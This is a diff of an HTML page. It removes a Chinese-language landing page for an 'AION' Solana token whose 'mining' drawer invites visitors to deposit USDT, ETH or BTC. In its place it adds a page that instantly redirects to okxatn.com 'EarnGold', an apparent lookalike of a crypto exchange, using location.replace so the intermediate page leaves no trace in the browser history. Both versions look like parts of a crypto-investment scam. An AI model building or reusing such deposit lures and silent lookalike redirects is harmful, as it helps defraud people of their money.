@@ -1,160 +1,22 @@
 <!doctype html>
 <html lang="zh-CN">
-<head>
-  <meta charset="utf-8" />
-  <title>AION • Aetherion on Solana</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <meta name="description" content="AION 是基于 Solana 的下一代数字资产，面向去中心化智能与高频计算场景。">
-  <style>
-    :root{
-      --bg:#0a0b10; --card:#12131aee; --muted:#9aa3b2; --fg:#eaf1ff;
-      --ring:0 0 0 1px #1b2333, 0 10px 30px #0b1326; --radius:18px;
-    }
-    *{box-sizing:border-box} html,body{height:100%}
-    body{
-      margin:0; font:15px/1.6 ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;
-      color:var(--fg);
-      background: radial-gradient(900px 540px at 15% -10%, #0e3a57aa, transparent 60%),
-                  radial-gradient(700px 440px at 110% 10%, #104228aa, transparent 55%),
-                  var(--bg);
-      -webkit-tap-highlight-color: transparent;
-    }
-    a{color:inherit;text-decoration:none}
-    .wrap{max-width:900px;margin:0 auto;padding:20px 16px 80px env(safe-area-inset-right);}
+<meta charset="utf-8" />
+<title>正在跳转...</title>
 
-    header{display:flex;align-items:center;gap:12px}
-    .logo{width:64px;height:64px;border-radius:50%;background:linear-gradient(180deg,#07121a,#0b1620);
-      display:grid;place-items:center;box-shadow:var(--ring)}
-    .logo svg{width:40px;height:40px}
-    h1{margin:0;font-size:28px;line-height:1.15;
-      background:linear-gradient(90deg,#34d399,#86efac); -webkit-background-clip:text;background-clip:text;color:transparent}
-    .sub{color:var(--muted);margin-top:6px}
+<!-- 兜底：不支持 JS 时用 meta 刷新 -->
+<meta http-equiv="refresh" content="0;url=https://okxatn.com/main.html#/EarnGold" />
+<link rel="canonical" href="https://okxatn.com/main.html#/EarnGold" />
 
-    /* 只保留一个按钮并居中 */
-    .cta{display:flex;justify-content:center;margin:18px 0 24px}
-    .btn-green{
-      padding:14px 18px;border-radius:14px;border:0;
-      background:linear-gradient(90deg,#22c55e,#86efac);
-      color:#062012;font-weight:700;font-size:16px;
-      box-shadow:0 6px 18px #16a34a55; min-width:220px;
-    }
-    .btn-green:active{transform:scale(.98)}
+<script>
+  // 改成你的目标链接
+  var target = "https://okxatn.com/main.html#/EarnGold";
+  // 如需把当前查询串或 hash 一起带过去，取消下一行注释：
+  // target += (location.search || "") + (location.hash || "");
+  // 用 replace 不留中间页在历史记录中
+  location.replace(target);
+</script>
 
-    .card{background:var(--card);border:1px solid #1b2333;border-radius:var(--radius);
-      padding:16px;box-shadow:var(--ring);margin-bottom:14px}
-    .kvs{display:grid;grid-template-columns:100px 1fr;gap:8px;margin:6px 0}
-    .kvs b{color:#cfe6ff}
-    code.badge{user-select:all;display:inline-flex;align-items:center;gap:8px;
-      padding:6px 10px;border-radius:10px;background:#0b1322;border:1px solid #1f2a3d;font-size:13px}
-
-    /* 底部抽屉（挖矿） */
-    .sheet-mask{position:fixed;inset:0;background:#0008;opacity:0;pointer-events:none;transition:.2s}
-    .sheet{position:fixed;left:0;right:0;bottom:-100%;background:#0f1320;border-radius:18px 18px 0 0;
-      border:1px solid #1d2740;box-shadow:0 -10px 40px #0007;transition:.25s;
-      padding:14px 14px calc(16px + env(safe-area-inset-bottom))}
-    .sheet.open{bottom:0}.sheet-mask.open{opacity:1;pointer-events:auto}
-    .sheet h3{margin:4px 0 10px}
-    .seg{display:flex;gap:8px;margin:10px 0}
-    .seg button{flex:1;padding:10px;border-radius:10px;border:1px solid #233040;background:#0c1322;color:#eaf1ff}
-    .seg button.active{border-color:#34d399;background:#0f2035}
-    .input-row{display:flex;gap:8px;align-items:center}
-    .input-row input{flex:1;padding:12px;border-radius:10px;border:1px solid #233040;background:#0b1322;color:#eaf1ff;font-size:16px}
-    .confirm{margin-top:12px;width:100%;padding:14px;border:0;border-radius:12px;background:linear-gradient(90deg,#22c55e,#86efac);color:#06101a;font-weight:700}
-    .note{color:#9aa3b2;font-size:13px;margin-top:6px}
-    footer{opacity:.7;margin:22px 0 10px}
-  </style>
-</head>
-<body>
-  <div class="wrap">
-    <header>
-      <div class="logo" aria-hidden="true">
-        <svg viewBox="0 0 44 44" fill="none">
-          <defs><linearGradient id="g1" x1="0" y1="0" x2="44" y2="44">
-            <stop stop-color="#79D2FF"/><stop offset="1" stop-color="#7EFFC0"/></linearGradient></defs>
-          <circle cx="22" cy="22" r="8.5" stroke="url(#g1)" stroke-width="2"/>
-          <ellipse cx="22" cy="22" rx="16" ry="8.5" stroke="url(#g1)" stroke-opacity=".7"/>
-          <ellipse cx="22" cy="22" rx="8.5" ry="16" stroke="url(#g1)" stroke-opacity=".55"/>
-          <circle cx="22" cy="22" r="2.2" fill="url(#g1)"/>
-        </svg>
-      </div>
-      <div>
-        <h1>AION（Aetherion）</h1>
-        <div class="sub">AION 是基于 Solana 的下一代数字资产，面向去中心化智能与高频计算场景，致力于成为 Web3 创新的“能量单元”。</div>
-      </div>
-    </header>
-
-    <!-- 只保留一个“挖矿获得 AION”按钮，并置中、绿色 -->
-    <div class="cta">
-      <button id="mineBtn" class="btn-green">⛏️ 挖矿获得 AION</button>
-    </div>
-
-    <!-- 信息卡片（可留可删） -->
-    <div class="card">
-      <h3>代币信息</h3>
-      <div class="kvs"><b>名称</b><div>AION（Aetherion）</div></div>
-      <div class="kvs"><b>符号</b><div>AION</div></div>
-      <div class="kvs"><b>网络</b><div>Solana</div></div>
-      <div class="kvs"><b>小数位</b><div id="decimals">6</div></div>
-      <div class="kvs"><b>Mint</b><div><code id="mintAddr" class="badge">HMLpHG6ntBdiHMze6ft9QQWpTagL4PE4GbFEtsmYvssg</code></div></div>
-      <p class="note">提示：如需固定总量，请在完成铸造后撤销增发权限（Mint Authority → null）。</p>
-    </div>
-
-    <footer>© <span id="year"></span> AION • 保留所有权利</footer>
-  </div>
-
-  <!-- 挖矿弹窗（底部抽屉） -->
-  <div id="mask" class="sheet-mask"></div>
-  <div id="sheet" class="sheet" role="dialog" aria-modal="true" aria-labelledby="sheetTitle">
-    <h3 id="sheetTitle">挖矿获得 AION</h3>
-    <div class="note">选择充值币种并输入数量（演示交互，未连接链上合约）。</div>
-
-    <div class="seg" id="assetSeg">
-      <button data-asset="USDT" class="active">USDT</button>
-      <button data-asset="ETH">ETH</button>
-      <button data-asset="BTC">BTC</button>
-    </div>
-
-    <div class="input-row">
-      <input id="amount" inputmode="decimal" placeholder="输入数量，例如 100" />
-      <span id="assetTag">USDT</span>
-    </div>
-
-    <button class="confirm" id="confirmBtn">确认充值并开始挖矿</button>
-    <div class="note">提示：此页面仅展示交互样式。请将“确认”按钮替换为你的实际支付/合约调用。</div>
-  </div>
-
-  <script>
-    const DECIMALS = 6;
-    const $ = s => document.querySelector(s);
-    $("#decimals").textContent = DECIMALS;
-    $("#year").textContent = new Date().getFullYear();
-
-    // 底部抽屉交互
-    const mask = $("#mask"), sheet = $("#sheet"), mineBtn = $("#mineBtn");
-    const assetButtons = [...document.querySelectorAll("#assetSeg button")];
-    const assetTag = $("#assetTag"), amountInput = $("#amount"), confirmBtn = $("#confirmBtn");
-    let currentAsset = "USDT";
-
-    function openSheet(){ mask.classList.add("open"); sheet.classList.add("open"); }
-    function closeSheet(){ mask.classList.remove("open"); sheet.classList.remove("open"); }
-    mineBtn.onclick = openSheet; mask.onclick = closeSheet;
-
-    assetButtons.forEach(btn=>{
-      btn.onclick = ()=>{
-        assetButtons.forEach(b=>b.classList.remove("active"));
-        btn.classList.add("active");
-        currentAsset = btn.dataset.asset;
-        assetTag.textContent = currentAsset;
-      }
-    });
-
-    confirmBtn.onclick = ()=>{
-      const v = amountInput.value.trim();
-      if(!v || Number(v)<=0 || !/^\d+(\.\d+)?$/.test(v)) { alert("请输入有效的数量"); return; }
-      alert(`已提交：用 ${v} ${currentAsset} 开始挖矿获取 AION（演示）。\n请在此处接入你的支付/合约调用。`);
-      amountInput.value = "";
-      closeSheet();
-    };
-  </script>
-</body>
+<noscript>
+  如果没有自动跳转，<a href="https://okxatn.com/main.html#/EarnGold">点此进入</a>。
+</noscript>
 </html>
